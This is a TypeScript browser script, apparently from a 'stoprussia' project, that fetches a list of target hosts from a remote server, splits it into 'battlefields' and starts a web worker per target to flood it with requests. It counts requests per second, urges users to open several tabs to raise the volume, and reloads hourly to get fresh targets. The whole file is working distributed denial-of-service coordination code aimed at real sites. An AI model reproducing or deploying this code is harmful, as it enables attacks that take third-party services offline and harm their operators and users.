document.addEventListener('DOMContentLoaded', () => {
  if (!('serviceWorker' in navigator)) { alert('Browser is unsupported!'); window.close() }

  const githubLink = document.createElement('a')
  githubLink.href='https://github.com/0x77dev/stoprussia#stoprussia'
  githubLink.innerText='GitHub repository and more info'
  document.body.append(githubLink)
  const statusEl = document.createElement('pre')
  document.body.append(statusEl)
  const metricsEl = document.createElement('pre')
  document.body.append(metricsEl)

  function* getChunks<T = any>(arr: T[], n: number) {
    for (let i = 0; i < arr.length; i += n) {
      yield arr.slice(i, i + n);
    }
  }

  let count = 0
  let total = 0
  const onWorkerMessage = (ev: MessageEvent) => {
    count++
    total++
  }

  setInterval(() =>{
    metricsEl.innerText = `${count} requests/sec; total ${total} requests`
    count = 0
  }, 1000)

  const start = async () => {
    const res = await fetch('https://srl.0x77.dev')
    let { targets, version } = await res.json() as { targets: string[]; version?: number }

    const battlefield = location.hash.length ? parseInt(location.hash.replace('#', ''))-1 : new Date().getSeconds() % 4
    targets = [...getChunks(targets, 15)][battlefield]

    console.log(version, battlefield, targets)

    statusEl.innerText = `Version: ${version}; Battlefield: ${battlefield}; Targets: ${targets.length}\n you can specify the battlefield by appending link with # for example: '/#1'\n targets: ${targets}\nalso you can get advantage of multiple tabs`
    console.log('Spawning workers')

    const spawn = (target: string) => {
      const worker = new Worker(new URL('worker.ts', import.meta.url), { type: 'module' })
      worker.postMessage([{ target }])
      worker.onmessage = onWorkerMessage
    }

    for (const target of targets) {
      // Array(3).fill(target).forEach(spawn)
      spawn(target)
    }
  }

  start()

  setInterval(() => location.reload(), 60 * 60000)
})